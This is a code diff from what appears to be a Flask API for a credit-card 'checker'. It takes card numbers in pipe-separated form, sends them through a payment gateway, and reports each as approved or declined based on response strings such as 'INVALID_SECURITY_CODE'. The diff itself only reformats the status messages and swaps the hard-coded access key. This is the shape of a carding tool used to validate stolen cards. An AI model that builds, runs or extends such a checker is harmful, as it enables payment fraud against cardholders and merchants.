@@ -121,25 +121,25 @@ def check_card(card_details):
 
         # --- Decide clean message ---
         if any(x in response_final.text for x in ["succeeded", "Thank You", "ADD_SHIPPING_ERROR", "is3DSecureRequired", "INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED", "INVALID_BILLING_ADDRESS"]):
-            return {"message": "APPROVED ✅", "response_text": error_text}
+            return {"message": "✅APPROVED", "response_text": error_text}
         else:
-            return {"message": "DECLINED ❌", "response_text": error_text}
+            return {"message": "❌DECLINED", "response_text": error_text}
 
     except Exception as e:
-        return {"message": "DECLINED ❌", "response_text": f"ERROR: {str(e)}"}
+        return {"message": "❌DECLINED", "response_text": f"ERROR: {str(e)}"}
 
 # --- API Endpoint ---
 @app.route('/gateway=<gateway>&key=<key>', methods=['GET'])
 def api_check(gateway, key):
     # Key validation
-    if key != "rockyalways":
+    if key != "payalismy":
         return jsonify({"message": "ACCESS DENIED ❌", "response_text": "ERROR: INVALID_KEY"}), 403
 
     card_info = request.args.get('cc')
     if not card_info:
-        return jsonify({"message": "DECLINED ❌", "response_text": "ERROR: MISSING_PARAM"}), 400
+        return jsonify({"message": "❌DECLINED", "response_text": "ERROR: MISSING_PARAM"}), 400
     if len(card_info.split('|')) != 4:
-        return jsonify({"message": "DECLINED ❌", "response_text": "ERROR: INVALID_FORMAT"}), 400
+        return jsonify({"message": "❌DECLINED", "response_text": "ERROR: INVALID_FORMAT"}), 400
     
     result = check_card(card_info)
     return jsonify(result)
